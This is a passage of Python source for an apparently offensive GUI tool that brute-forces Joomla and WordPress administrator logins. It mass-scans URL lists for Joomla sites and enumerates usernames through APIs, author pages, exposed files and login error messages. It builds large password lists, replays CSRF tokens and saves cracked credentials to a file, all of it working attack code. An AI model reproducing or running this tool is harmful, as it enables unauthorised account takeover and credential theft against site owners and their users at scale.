        if meta_authors:
            self.log(f"Prioritizing discovered meta authors: {', '.join(meta_authors)}", "#ff00ff")
            # Move meta authors to the beginning of the list
            for author in reversed(meta_authors):
                if author in discovered_users:
                    discovered_users.remove(author)
                    discovered_users.insert(0, author)
        
        self.log(f"Starting attack with {len(discovered_users)} user(s)", "#00ffff")
        
        # Generate or load passwords
        passwords = []
        auto_pass = self.kwargs.get('auto_pass', False)
        password_file = self.kwargs.get('password_file', '')
        
        if auto_pass:
            domain = self.kwargs.get('domain', '')
            passwords = self.generate_auto_passwords(domain)
            self.log(f"Generated {len(passwords)} passwords automatically", "#00ff00")
        elif password_file:
            try:
                # Try different encodings to handle the file
                encodings = ['utf-8', 'latin-1', 'iso-8859-1', 'cp1252']
                for encoding in encodings:
                    try:
                        with open(password_file, 'r', encoding=encoding) as f:
                            passwords = [line.strip() for line in f if line.strip()]
                        break
                    except UnicodeDecodeError:
                        continue
                if not passwords:
                    self.log(f"Could not read password file with any encoding: {password_file}", "#ff0000")
                    return
                self.log(f"Loaded {len(passwords)} passwords from wordlist", "#00ff00")
            except FileNotFoundError:
                self.log(f"Password file not found: {password_file}", "#ff0000")
                return
        else:
            self.log("No passwords specified", "#ff0000")
            return
            
        total_attempts = len(discovered_users) * len(passwords)
        self.log(f"Total login attempts to try: {total_attempts}", "#ffff00")
        
        # Execute brute force
        for i, user in enumerate(discovered_users):
            if self.should_stop():
                self.log("Attack stopped by user", "#ff0000")
                return
                
            self.log(f"Testing user: {user}", "#ff00ff")
            success = self.do_brute_force(administrator_url, option, task, ret, user, passwords, total_attempts, i)
            
            if success:
                # Option to continue with other users or stop
                self.log("Valid credentials found! Continue with other users?", "#ffff00")
                # In GUI mode, we'll just continue for now
                
        self.log("Attack completed!", "#00ff00")
        
    def run_mass_scan(self):
        url_file = self.kwargs.get('url_file', '')
        self.log(f"Starting Joomla mass scan with URLs from: {url_file}", "#00ffff")
        
        try:
            # Try different encodings to handle the file
            encodings = ['utf-8', 'latin-1', 'iso-8859-1', 'cp1252']
            for encoding in encodings:
                try:
                    with open(url_file, 'r', encoding=encoding) as f:
                        urls = [line.strip() for line in f if line.strip()]
                    break
                except UnicodeDecodeError:
                    continue
            if not urls:
                self.log(f"Could not read URL file with any encoding: {url_file}", "#ff0000")
                return
        except FileNotFoundError:
            self.log(f"URL file not found: {url_file}", "#ff0000")
            return
            
        self.log(f"Loaded {len(urls)} URLs for scanning", "#00ff00")
        
        # Scan URLs to detect Joomla sites
        joomla_urls = []
        threads = self.kwargs.get('threads', 5)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            future_to_url = {executor.submit(self.scanner.detect_joomla, url): url for url in urls}
            
            for i, future in enumerate(concurrent.futures.as_completed(future_to_url)):
                if self.should_stop():
                    self.log("Mass scan stopped by user", "#ff0000")
                    return
                    
                url = future_to_url[future]
                try:
                    is_joomla, version = future.result()
                    if is_joomla:
                        version_str = f"v{version}" if version else "unknown version"
                        self.log(f"Joomla found: {url} ({version_str})", "#00ff00")
                        joomla_urls.append((url, version))
                    else:
                        if self.kwargs.get('verbose', False):
                            self.log(f"Not Joomla: {url}", "#ff0000")
                except Exception as e:
                    if self.kwargs.get('verbose', False):
                        self.log(f"Error scanning {url}: {e}", "#ff0000")
                
                # Update progress
                self.progress(int((i + 1) * 100 / len(urls)))
        
        if not joomla_urls:
            self.log("No Joomla sites found", "#ff0000")
            return
            
        self.log(f"Found {len(joomla_urls)} Joomla sites", "#00ff00")
        
        # Prepare credentials for each site
        for i, (url, version) in enumerate(joomla_urls):
            if self.should_stop():
                self.log("Mass scan stopped by user", "#ff0000")
                return
                
            self.log(f"Attacking: {url} (Joomla {version if version else 'unknown'})", "#ff00ff")
            
            # Set up the target
            base_url = url.rstrip('/')
            administrator_url = base_url + '/administrator/'
            ret = 'aW5kZXgucGhw'
            option = 'com_login'
            task = 'login'
            
            # Initialize session
            self.session = requests.Session()
            self.session.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'})
            
            try:
                response = self.session.get(administrator_url, proxies=self.get_proxy(), timeout=10)
                self.session.cookies.clear()  # Nettoyer les cookies initiaux
            except requests.RequestException as e:
                self.log(f"Error connecting to {administrator_url}: {e}", "#ff0000")
                continue
            
            # Discover usernames if needed
            discovered_users = []
            meta_authors = []
            
            auto_user = self.kwargs.get('auto_user', False)
            username = self.kwargs.get('username', '')
            user_file = self.kwargs.get('user_file', '')
            auto_mode = self.kwargs.get('auto_pass', False)
            
            if auto_user:
                self.log("Attempting to discover usernames...", "#00ffff")
                discovered_users, meta_authors = self.discover_usernames(base_url, administrator_url)
            elif user_file:
                try:
                    # Try different encodings to handle the file
                    encodings = ['utf-8', 'latin-1', 'iso-8859-1', 'cp1252']
                    for encoding in encodings:
                        try:
                            with open(user_file, 'r', encoding=encoding) as f:
                                discovered_users = [line.strip() for line in f if line.strip()]
                            break
                        except UnicodeDecodeError:
                            continue
                    if not discovered_users:
                        self.log(f"Could not read user file with any encoding: {user_file}", "#ff0000")
                        continue
                except FileNotFoundError:
                    self.log(f"User file not found: {user_file}", "#ff0000")
                    continue
            elif username:
                discovered_users = [username]
            else:
                self.log(f"No usernames specified for {url}", "#ff0000")
                continue
                
            # Generate or load passwords
            passwords = []
            auto_pass = self.kwargs.get('auto_pass', False)
            password_file = self.kwargs.get('password_file', '')
            
            if auto_pass:
                domain = self.kwargs.get('domain', '')
                passwords = self.generate_auto_passwords(domain)
                self.log(f"Generated {len(passwords)} passwords automatically", "#00ff00")
            elif password_file:
                try:
                    # Try different encodings to handle the file
                    encodings = ['utf-8', 'latin-1', 'iso-8859-1', 'cp1252']
                    for encoding in encodings:
                        try:
                            with open(password_file, 'r', encoding=encoding) as f:
                                passwords = [line.strip() for line in f if line.strip()]
                            break
                        except UnicodeDecodeError:
                            continue
                    if not passwords:
                        self.log(f"Could not read password file with any encoding: {password_file}", "#ff0000")
                        continue
                    self.log(f"Loaded {len(passwords)} passwords from wordlist", "#00ff00")
                except FileNotFoundError:
                    self.log(f"Password file not found: {password_file}", "#ff0000")
                    continue
            else:
                self.log("No passwords specified", "#ff0000")
                continue
                
            # Execute brute force
            for user in discovered_users:
                if self.should_stop():
                    self.log("Mass scan stopped by user", "#ff0000")
                    return
                    
                self.log(f"Testing user: {user}", "#ff00ff")
                self.do_brute_force(administrator_url, option, task, ret, user, passwords, 0, 0)
                
            # Update progress
            self.progress(int((i + 1) * 100 / len(joomla_urls)))
                
        self.log("Mass scan completed!", "#00ff00")
        
    def discover_usernames(self, base_url, administrator_url):
        discovered_users = set()
        meta_authors = []
        
        # Method 1: Check for user enumeration via com_users
        self.log("Trying user enumeration via com_users...", "#ffff00")
        user_enum_urls = [
            f'{base_url}/index.php?option=com_users&view=users',
            f'{base_url}/component/users/?view=users',
            f'{base_url}/index.php?option=com_users&format=json'
        ]
        
        for enum_url in user_enum_urls:
            try:
                response = self.session.get(enum_url, proxies=self.get_proxy(), timeout=5)
                
                # Look for usernames in JSON response
                if 'application/json' in response.headers.get('content-type', ''):
                    try:
                        json_data = response.json()
                        if isinstance(json_data, list):
                            for item in json_data:
                                if 'username' in item:
                                    discovered_users.add(item['username'])
                                    self.log(f"Discovered username (JSON): {item['username']}", "#00ff00")
                                if 'name' in item and item['name']:
                                    discovered_users.add(item['name'])
                                    self.log(f"Discovered name (JSON): {item['name']}", "#00ff00")
                    except:
                        pass
                
                # Look for usernames in HTML response
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Check for user listings in tables
                user_links = soup.find_all('a', href=re.compile(r'view=user|id=*|userid=*'))
                for link in user_links:
                    user_id_match = re.search(r'[?&](id|userid)=(\d+)', link.get('href', ''))
                    if user_id_match:
                        user_id = user_id_match.group(2)
                        # Try to get more info about this user
                        user_url = f"{base_url}/index.php?option=com_users&view=user&id={user_id}"
                        try:
                            user_response = self.session.get(user_url, proxies=self.get_proxy(), timeout=5)
                            user_soup = BeautifulSoup(user_response.text, 'html.parser')
                            
                            # Look for username in input fields
                            username_input = user_soup.find('input', {'name': 'jform[username]'})
                            if username_input and username_input.get('value'):
                                discovered_users.add(username_input.get('value'))
                                self.log(f"Discovered username (form): {username_input.get('value')}", "#00ff00")
                                
                            # Look for name in input fields
                            name_input = user_soup.find('input', {'name': re.compile(r'jform\[(name|username)\]')})
                            if name_input and name_input.get('value'):
                                discovered_users.add(name_input.get('value'))
                                self.log(f"Discovered name (form): {name_input.get('value')}", "#00ff00")
                                
                        except requests.RequestException:
                            continue
                
                # Look for usernames in JavaScript data
                script_tags = soup.find_all('script')
                for script in script_tags:
                    if script.string:
                        # Look for JSON data with user information
                        user_matches = re.findall(r'"username":"([^"]+)"', script.string)
                        user_matches.extend(re.findall(r'"name":"([^"]+)"', script.string))
                        user_matches.extend(re.findall(r"'username':'([^']+)'", script.string))
                        user_matches.extend(re.findall(r"'name':'([^']+)'", script.string))
                        
                        for user in user_matches:
                            if len(user) > 2 and user not in ['admin', 'administrator', 'super', 'user', 'guest']:
                                discovered_users.add(user)
                                self.log(f"Discovered username (JS): {user}", "#00ff00")
            
            except requests.RequestException:
                continue
        
        # Method 2: Check common files that might leak usernames
        self.log("Checking common files for username leaks...", "#ffff00")
        common_files = [
            '/administrator/manifests/files/joomla.xml',
            '/language/en-GB/en-GB.xml',
            '/media/system/js/core.js',
            '/templates/system/css/system.css',
            '/configuration.php',
            '/.htaccess',
            '/robots.txt'
        ]
        
        for file_path in common_files:
            try:
                file_url = base_url + file_path
                response = self.session.get(file_url, proxies=self.get_proxy(), timeout=5)
                
                # Look for usernames in file content
                if response.status_code == 200:
                    # Look for common username patterns
                    potential_users = re.findall(r'[Uu]ser[Nn]ame\s*[=:]\s*[\'"]([^\'"]+)[\'"]', response.text)
                    potential_users.extend(re.findall(r'[Uu]ser\s*[=:]\s*[\'"]([^\'"]+)[\'"]', response.text))
                    potential_users.extend(re.findall(r'[Aa]dmin\s*[=:]\s*[\'"]([^\'"]+)[\'"]', response.text))
                    
                    for user in potential_users:
                        if len(user) > 2 and user not in ['admin', 'administrator', 'super', 'user', 'guest']:
                            discovered_users.add(user)
                            self.log(f"Discovered username (file): {user}", "#00ff00")
                            
            except requests.RequestException:
                continue
        
        # Method 3: Check for author information in articles
        self.log("Checking for author information in articles...", "#ffff00")
        try:
            # Try to access some articles
            for i in range(1, 6):  # Check first 5 articles
                article_url = f"{base_url}/index.php?option=com_content&view=article&id={i}"
                response = self.session.get(article_url, proxies=self.get_proxy(), timeout=5)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Look for author information
                author_elements = soup.find_all(class_=re.compile(r'author|createdby|byline'))
                for element in author_elements:
                    author_text = element.get_text().strip()
                    if author_text and 'by ' in author_text.lower():
                        author_name = author_text.split('by ')[-1].strip()
                        if author_name and len(author_name) > 2:
                            discovered_users.add(author_name)
                            self.log(f"Discovered author: {author_name}", "#00ff00")
                
                # Look for created by information in meta tags
                meta_author = soup.find('meta', attrs={'name': 'author'})
                if meta_author and meta_author.get('content'):
                    author_name = meta_author.get('content').strip()
                    if author_name and len(author_name) > 2:
                        discovered_users.add(author_name)
                        meta_authors.append(author_name)
                        self.log(f"Discovered meta author: {author_name}", "#00ff00")
                        
        except requests.RequestException:
            pass
        
        # Method 4: Check common usernames if nothing found or if we're doing user enumeration
        user_enum = self.kwargs.get('user_enum', False)
        if not discovered_users or user_enum:
            self.log("Testing common usernames...", "#ffff00")
            common_usernames = ['admin', 'administrator', 'superuser', 'root', 'joomla', 'user', 'test', 'demo']
            
            for user in common_usernames:
                # Test if username exists by attempting login
                if self.test_username_exists(administrator_url, user):
                    discovered_users.add(user)
                    self.log(f"Valid username found: {user}", "#00ff00")
                else:
                    if self.kwargs.get('verbose', False):
                        self.log(f"Username not valid: {user}", "#ff0000")
        
        # Add domain-based usernames if in auto mode
        auto_mode = self.kwargs.get('auto_pass', False)
        domain = self.kwargs.get('domain', '')
        if auto_mode and domain:
            domain_parts = domain.split('.')
            domain_base = domain_parts[0]
            discovered_users.add(domain_base)
            discovered_users.add(domain_base + 'admin')
            discovered_users.add('admin' + domain_base)
            discovered_users.add(domain_base + 'user')
            discovered_users.add('webmaster')
            discovered_users.add('administrator')
            discovered_users.add('admin')
            
            self.log(f"Added domain-based usernames for {domain}", "#00ff00")
        
        discovered_users = list(discovered_users)
        
        if not discovered_users:
            self.log("No usernames discovered. Using 'admin' as default.", "#ff0000")
            discovered_users = ['admin']
        else:
            self.log(f"Discovered {len(discovered_users)} username(s)", "#00ff00")
            
        return discovered_users, meta_authors
        
    def generate_auto_passwords(self, domain):
        passwords = set()
        
        # Add common passwords
        common_passwords = [
            'admin', 'password', '123456', '12345678', '1234', 'qwerty', '12345',
            'letmein', 'welcome', 'monkey', 'password1', 'admin123', 'adminadmin',
            "admin", "password", "123456", "12345@67890", "1234567890", "Demo", "demo", "manager", "12345678", "1234", "12345", 
            "qwerty", "12345@6789", "12345@678", "12345@6780", "67890",  "12345@67890","12345@98760","12345@abcde","12345@ABCDE","12345@!@#$%",
            "12345@67890Ab","12345@password","12345@secure","12345@qwerty",
            "12345@admin123" , "letmein", "admin123", "welcome", "monkey", "sunshine",
            "password1", "123456789", "football", "iloveyou", "starwars", "dragon",
            "passw0rd", "master", "hello", "freedom", "whatever", "qazwsx", "trustno1",
            "654321", "jordan23", "harley", "password123", "1q2w3e4r", "555555",
            "loveme", "hello123", "zaq1zaq1", "abc123", "123123", "donald", "batman",
            "access", "shadow", "superman", "qwerty123", "michael", "mustang", "jennifer",
            "admin", "password", "123456", "Demo", "demo", "manager",  "12345678", "1234", "12345", 
            "qwerty", "letmein", "admin123", "welcome", "monkey", "sunshine",
            "password1", "123456789", "football", "iloveyou", "starwars", "dragon",
            "passw0rd", "master", "hello", "freedom", "whatever", "qazwsx", "trustno1",
            "654321", "jordan23", "harley", "password123", "1q2w3e4r", "555555",
            "loveme", "hello123", "zaq1zaq1", "abc123", "123123", "donald", "batman",
            "access", "shadow", "superman", "qwerty123", "michael", "mustang", "jennifer",
            "111111", "2000", "jordan", "super123", "123456a", "andrew", "matthew",
            "golfer", "buster", "nicole", "jessica", "pepper", "1111", "zxcvbn", "555555",
            "11111111", "131313", "freedom1", "7777777", "pass", "maggie", "159753",
            "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer",
            "love", "ashley", "6969", "nicole1", "chelsea", "biteme", "matthew1",
            "access14", "yankees", "987654321", "dallas", "austin", "thunder", "taylor",
            "matrix", "minecraft", "buster1", "hello1", "charlie", "1234567", "1234567890",
            "888888", "123123123", "flower", "password2", "soccer", "purple", "george",
            "chicken", 'samsung', 'apple', 'google', 'microsoft', 'ibm', 'intel', 'amd', 'nvidia',
            'yahoo', 'hotmail', 'gmail', 'outlook', 'live', 'skype', 'facebook',
            'twitter', 'instagram', 'linkedin', 'youtube', 'whatsapp', 'telegram',
            'discord', 'slack', 'zoom', 'team', 'office', 'home', 'work',
            'school', 'college', 'university', 'student', 'teacher', 'professor',
            'manager', 'director', 'ceo', 'cto', 'cfo', 'admin1', 'admin2',
            'admin3', 'sysadmin', 'webadmin', 'server', 'ftp', 'ssh', 'http',
            'https', 'ftpadmin', 'dbadmin', 'mailadmin', 'webmaster', 'postgres',
            'apache', 'nginx', 'iis', 'tomcat', 'ubuntu', 'debian', 'centos',
            'redhat', 'fedora', 'windows', 'linux', 'macos', 'android', 'ios',
            'backup', 'archive', 'data', 'database', 'storage', 'security',
            'firewall', 'vpn', 'network', 'wifi', 'ethernet', 'bluetooth',
            'wireless', 'router', 'switch', 'gateway', 'modem', 'broadband',
            'dsl', 'cable', 'fiber', 'voip', 'pbx', 'phone', 'mobile', 'tablet',
            'desktop', 'laptop', 'notebook', 'workstation', 'server1', 'server2',
            'server3', 'vmware', 'virtualbox', 'docker', 'kubernetes', 'jenkins',
            'gitlab', 'github', 'bitbucket', 'jira', 'confluence', 'trello',
            'wordpress', 'joomla', 'drupal', 'magento', 'prestashop', 'opencart',
            'phpbb', 'mybb', 'smf', 'vbulletin', 'xenforo', 'ipboard',
            'admin123!', 'Admin123', 'Admin@123', 'Admin#123', 'Admin$123',
            'P@ssw0rd', 'P@ssword123', 'Passw0rd!', 'Qwerty@123', 'Qwerty123!',
            '1qaz@WSX', '2wsx#EDC', '3edc$RFV', '4rfv%TGB', '5tgb^YHN',
            '6yhn&UJM', '7ujm*IK<', '8ik,(OL>', '9ol.)P:?', '0p;/[\'{]',
            '!@#$%^&*', '!QAZ2wsx', '1q2w3e4r5t', '1q2w3e4r', '1q2w3e',
            'zaq1@WSX', 'xsw2#EDC', 'cde3$RFV', 'vfr4%TGB', 'bgt5^YHN',
            'nhy6&UJM', 'mju7*IK<', ',ki8(OL>)', '.lo9(P:?)', '/;p0[\'{]'
        ]
        
        for pwd in common_passwords:
            passwords.add(pwd)
        
        # Add domain-based passwords
        if domain:
            domain_parts = domain.split('.')
            domain_base = domain_parts[0]
            
            # Add domain name variations
            passwords.add(domain_base)
            passwords.add(domain_base + '123')
            passwords.add(domain_base + '1234')
            passwords.add(domain_base + '12345')
            passwords.add(domain_base + '123456')
            passwords.add(domain_base + '2023')
            passwords.add(domain_base + '2024')
            passwords.add(domain_base + '!')
            passwords.add(domain_base + '@')
            passwords.add(domain_base + '#')
            
            # Ajout des nombres de 0 à 1000
            for i in range(1001):
                passwords.add(domain_base + str(i))
                # Ajout avec préfixe 0 (00, 000, etc.) jusqu'à 4 chiffres
                passwords.add(domain_base + str(i).zfill(2))  # 00 à 99
                passwords.add(domain_base + str(i).zfill(3))  # 000 à 999
                passwords.add(domain_base + str(i).zfill(4))  # 0000 à 1000
        
        # Add number variations (01 to 1000)
        for i in range(1, 1001):
            num_str = str(i).zfill(2)  # Pad with zeros
            passwords.add(num_str)
            
        # Add year variations (1801 to 2050)
        for year in range(1801, 2051):
            passwords.add(str(year))
        
        # Add special character variations
        special_chars = ['!', '@', '#', '$', '%', '^', '&', '*', '()', '{}', '[]']
        base_passwords = list(passwords)  # Create a copy to avoid modifying during iteration
        
        for pwd in base_passwords:
            for char in special_chars:
                # Add special character at the end
                passwords.add(pwd + char)
                # Add special character at the beginning
                passwords.add(char + pwd)
                # Add special character at both ends
                passwords.add(char + pwd + char)
        
        return list(passwords)
        
    def test_username_exists(self, administrator_url, username):
        """Test if a username exists by attempting login and checking the error message"""
        # Réinitialiser la session pour ce test
        original_session = self.session
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'})
        
        try:
            # Get CSRF token
            r = self.session.get(administrator_url, proxies=self.get_proxy(), timeout=5)
            soup = BeautifulSoup(r.text, 'html.parser')
            csrf_inputs = soup.find_all('input', {'type': 'hidden', 'name': True})
            
            data = {
                'username': username,
                'passwd': 'invalid_password_12345',
                'option': 'com_login',
                'task': 'login',
                'return': 'aW5kZXgucGhw'
            }
            
            # Add all hidden inputs to the data
            for inp in csrf_inputs:
                if inp['name'] not in data:
                    data[inp['name']] = inp.get('value', '1')
            
            # Send login request
            r = self.session.post(administrator_url, data=data, proxies=self.get_proxy(), timeout=10)
            
            # Vérifications plus précises
            content_lower = r.text.lower()
            
            # Messages d'erreur spécifiques pour username invalide
            invalid_user_messages = [
                'invalid username',
                'username not found',
                'user does not exist',
                'unknown user',
                'user not registered'
            ]
            
            # Messages d'erreur pour mot de passe incorrect (mais username valide)
            wrong_password_messages = [
                'password do not match',
                'incorrect password',
                'wrong password',
                'invalid password'
            ]
            
            # Vérifier les messages d'erreur spécifiques
            for msg in invalid_user_messages:
                if msg in content_lower:
                    return False
                    
            for msg in wrong_password_messages:
                if msg in content_lower:
                    return True
                    
            # Vérifier le comportement par défaut
            if 'username and password do not match' in content_lower:
                return True
            
            # Par défaut, supposer que l'username existe
            return True
            
        except requests.RequestException:
            return False
        finally:
            # Restaurer la session originale
            self.session = original_session
            
    def check_login_success(self, response, administrator_url):
        """
        Vérifie de manière robuste si la connexion a réussi
        """
        # Vérifier la redirection
        if response.history and len(response.history) > 0:
            final_url = response.url
            if 'administrator' in final_url and 'index.php' in final_url:
                # Vérifier le contenu de la page d'administration
                content_lower = response.text.lower()
                
                # Indicateurs de connexion réussie
                success_indicators = [
                    'logout', 'profile', 'article', 'install', 'control panel', 
                    'dashboard', 'manage articles', 'user manager', 'system information',
                    'administrator', 'media manager', 'menu manager', 'module manager',
                    'extension manager', 'global configuration', 'site maintenance',
                    'private area', 'welcome to your account', 'my subscriptions',
                    'edit profile', 'account settings', 'content manager', 'category manager',
                    'template manager', 'language manager', 'redirect manager',
                    'private messages', 'my downloads', 'order history'
                ]
                
                # Indicateurs d'échec de connexion
                failure_indicators = [
                    'login', 'username', 'password', 'invalid', 'incorrect',
                    'authentication failed', 'login failure', 'access denied',
                    'please try again', 'wrong credentials', 'account locked',
                    'temporary lockout', 'too many attempts', 'security token',
                    'captcha verification', 'two-factor authentication', 'please login',
                    'sign in required', 'restricted access', 'unauthorized access',
                    'login form', 'forgot password', 'reset password', 'account disabled'
                ]
                
                # Compter les indicateurs positifs et négatifs
                success_count = sum(1 for indicator in success_indicators if indicator in content_lower)
                failure_count = sum(1 for indicator in failure_indicators if indicator in content_lower)
                
                # Si plus d'indicateurs positifs que négatifs, considérer comme réussi
                return success_count > failure_count
        
        # Vérifier les cookies de session
        session_cookies = self.session.cookies.get_dict()
        if any('session' in key.lower() or 'token' in key.lower() for key in session_cookies.keys()):
            # Vérifier la longueur des cookies (les sessions valides sont généralement plus longues)
            for cookie_value in session_cookies.values():
                if len(cookie_value) > 20:  # Les cookies de session sont généralement longs
                    return True
        
        # Vérifier le code HTTP
        if response.status_code == 303 or response.status_code == 302:
            # Redirection après connexion réussie
            location = response.headers.get('location', '')
            if 'administrator' in location and 'index.php' in location:
                return True
        
        return False
            
    def do_brute_force(self, administrator_url, option, task, ret, username, passwords, total_attempts, user_index):
        total_passwords = len(passwords)
        
        for i, password in enumerate(passwords):
            if self.should_stop():
                return False
                
            password = password.strip()
            
            # Réinitialiser la session à chaque tentative pour éviter les faux positifs
            self.session = requests.Session()
            self.session.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'})
            
            # Get CSRF token
            try:
                r = self.session.get(administrator_url, proxies=self.get_proxy(), timeout=5)
                soup = BeautifulSoup(r.text, 'html.parser')
                csrf_inputs = soup.find_all('input', {'type': 'hidden', 'name': True})
                
                data = {
                    'username': username,
                    'passwd': password,
                    'option': option,
                    'task': task,
                    'return': ret
                }
                
                # Add all hidden inputs to the data
                for inp in csrf_inputs:
                    if inp['name'] not in data:
                        data[inp['name']] = inp.get('value', '1')
                
            except Exception as e:
                self.log(f"Error retrieving CSRF token: {e}", "#ff0000")
                continue
            
            # Send login request
            try:
                r = self.session.post(administrator_url, data=data, proxies=self.get_proxy(), timeout=10)
                
                # Vérifications plus robustes pour détecter une connexion réussie
                success = self.check_login_success(r, administrator_url)
                
                if success:
                    self.log(f"SUCCESS: Valid credentials found: {username}:{password}", "#00ff00")
                    # Save credentials
                    self.save_credentials(administrator_url.replace('/administrator/', ''), username, password)
                    # Try to get the session cookie for proof
                    if self.session.cookies:
                        self.log(f"Session cookies: {dict(self.session.cookies)}", "#00ff00")
                    return True
                else:
                    if self.kwargs.get('verbose', False):
                        progress = f"({i+1}/{total_passwords})"
                        self.log(f"FAIL: {username}:{password} {progress}", "#ff0000")
            
            except requests.RequestException as e:
                self.log(f"Request failed: {e}", "#ff0000")
            
            # Delay between requests if specified
            delay = self.kwargs.get('delay', 0)
            if delay > 0:
                sleep(delay)
                
            # Update progress if we're in single target mode
            if total_attempts > 0:
                progress = user_index * len(passwords) + i + 1
                self.progress(int(progress * 100 / total_attempts))
        
        self.log(f"No valid password found for user: {username}", "#ffff00")
        return False
        
    def save_credentials(self, url, username, password):
        """Sauvegarde les credentials trouvés"""
        with self.lock:
            entry = f"{url}/administrator#{username}@{password}\n"
            self.found_credentials.append(entry)
            
            try:
                with open("joooAccess.txt", "a", encoding="utf-8") as f:
                    f.write(entry)
                    
                self.log(f"Saved credentials: {entry.strip()}", "#00ff00")
            except Exception as e:
                self.log(f"Error saving credentials: {e}", "#ff0000")
                
    def get_proxy(self):
        proxy_str = self.kwargs.get('proxy', '')
        if proxy_str:
            parsed_proxy_url = urlparse(proxy_str)
            return {parsed_proxy_url.scheme: parsed_proxy_url.netloc}
        return None


class WordPressBruteForceGUI:
    def __init__(self, **kwargs):
        self.kwargs = kwargs
        self.log_callback = None
        self.progress_callback = None
        self.stop_check = None
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'})
        self.lock = Lock()
        self.found_credentials = []
        
    def log(self, message, color="#00ffff"):
        if self.log_callback:
            self.log_callback(message, color)
            
    def progress(self, value):
        if self.progress_callback:
            self.progress_callback(value)
            
    def should_stop(self):
        return self.stop_check() if self.stop_check else False
        
    def run(self):
        url = self.kwargs.get('url', '')
        self.log(f"Starting WordPress attack on: {url}", "#00ffff")
        
        # Get username
        username = self.kwargs.get('username', '')
        if not username:
            self.log("No username specified", "#ff0000")
            return
        
        # Get password list
        password_file = self.kwargs.get('password_file', '')
        if password_file:
            try:
                # Try different encodings to handle the file
                encodings = ['utf-8', 'latin-1', 'iso-8859-1', 'cp1252']
                for encoding in encodings:
                    try:
                        with open(password_file, 'r', encoding=encoding) as f:
                            passwords = [line.strip() for line in f if line.strip()]
                        break
                    except UnicodeDecodeError:
                        continue
                if not passwords:
                    self.log(f"Could not read password file with any encoding: {password_file}", "#ff0000")
                    return
                self.log(f"Loaded {len(passwords)} passwords from wordlist", "#00ff00")
            except FileNotFoundError:
                self.log(f"Password file not found: {password_file}", "#ff0000")
                return
        else:
            self.log("No passwords specified", "#ff0000")
            return
        
        # Execute brute force
        self.log(f"Starting attack with user: {username}", "#00ffff")
        self.log(f"Total login attempts to try: {len(passwords)}", "#ffff00")
        
        success = self.do_brute_force(url, username, passwords)
        
        if success:
            self.log("Attack completed successfully!", "#00ff00")
        else:
            self.log("Attack completed - no valid credentials found", "#ffff00")
    def get_wordpress_users(self, url):
        """Récupère tous les usernames disponibles sur le site WordPress"""
        users = set()
        
        # REST API
        try:
            endpoint = urljoin(url, "/wp-json/wp/v2/users")
            response = self.make_request(endpoint)
            if response and response.status_code == 200:
                try:
                    data = response.json()
                    if isinstance(data, list):
                        for user in data:
                            if 'slug' in user:
                                users.add(user['slug'])
                            elif 'name' in user:
                                users.add(user['name'])
                except ValueError:
                    pass
        except:
            pass
        
        # Author sitemap
        try:
            endpoint = urljoin(url, "/author-sitemap.xml")
            response = self.make_request(endpoint)
            if response and response.status_code == 200 and ("Sitemap" in response.text or "sitemap" in response.text.lower()):
                found_users = re.findall(r"author/([^/]+)/", response.text)
                users.update(found_users)
        except:
            pass
        
        # Author pages
        try:
            for author_id in range(1, 10):  # Check first 9 authors
                endpoint = urljoin(url, f"/?author={author_id}")
                response = self.make_request(endpoint, allow_redirects=False)
                
                if response and response.status_code in [301, 302]:
                    location = response.headers.get('location', '')
                    if '/author/' in location:
                        user = location.split('/author/')[-1].rstrip('/')
                        users.add(user)
        except:
            pass
        
        # Feed RSS (peut contenir des noms d'auteur)
        try:
            feed_urls = [urljoin(url, "/feed/"), urljoin(url, "/feed/rss/")]
            for feed_url in feed_urls:
                response = self.make_request(feed_url)
                if response and response.status_code == 200:
                    # Chercher les noms d'auteur dans le feed
                    author_matches = re.findall(r'<dc:creator>([^<]+)</dc:creator>', response.text, re.IGNORECASE)
                    author_matches.extend(re.findall(r'<author>([^<]+)</author>', response.text, re.IGNORECASE))
                    users.update(author_matches)
        except:
            pass
        
        # Vérifier les usernames communs si rien n'a été trouvé
        if not users:
            common_users = ['admin', 'administrator', 'root', 'test', 'demo', 'user']
            for user in common_users:
                # Tester si l'utilisateur existe
                if self.test_wordpress_user_exists(url, user):
                    users.add(user)
        
        return list(users)
    
    def test_wordpress_user_exists(self, url, username):
        """Teste si un utilisateur WordPress existe"""
        try:
            login_url = urljoin(url, "/wp-login.php")
            
            # Préparer les données de login
            login_data = {
                'log': username,
                'pwd': 'invalid_password_test_12345',
                'wp-submit': 'Log In',
                'redirect_to': urljoin(url, "/wp-admin/"),
                'testcookie': '1'
            }
            
            # Effectuer la tentative de login
            response = self.session.post(
                login_url,
                data=login_data,
                headers={'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'},
                timeout=REQUEST_TIMEOUT,
                allow_redirects=True
            )
            
            if not response:
                return False
            
            # Vérifier les messages d'erreur spécifiques
            content_lower = response.text.lower()
            
            # Messages d'erreur pour username invalide
            invalid_user_messages = [
                'invalid username',
                'unknown username',
                'username not found',
                'user does not exist'
            ]
            
            # Messages d'erreur pour mot de passe incorrect (mais username valide)
            wrong_password_messages = [
                'password is incorrect',
                'incorrect password',
                'wrong password',
                'invalid password'
            ]
            
            # Si on trouve des messages de mot de passe incorrect, l'username existe
            for msg in wrong_password_messages:
                if msg in content_lower:
                    return True
            
            # Si on trouve des messages d'username invalide, l'username n'existe pas
            for msg in invalid_user_messages:
                if msg in content_lower:
                    return False
            
            # Par défaut, supposer que l'username existe si on ne peut pas déterminer
            return True
            
        except Exception:
            return False
        
    def generate_auto_passwords(self, username=None, domain=None):
        """Génère des mots de passe automatiquement basés sur le username et le domaine"""
        passwords = set()
        
        # Add common passwords
        common_passwords = [
            'admin', 'password', '123456', '12345678', '1234', 'qwerty', '12345',
            'letmein', 'welcome', 'monkey', 'password1', 'admin123', 'adminadmin',
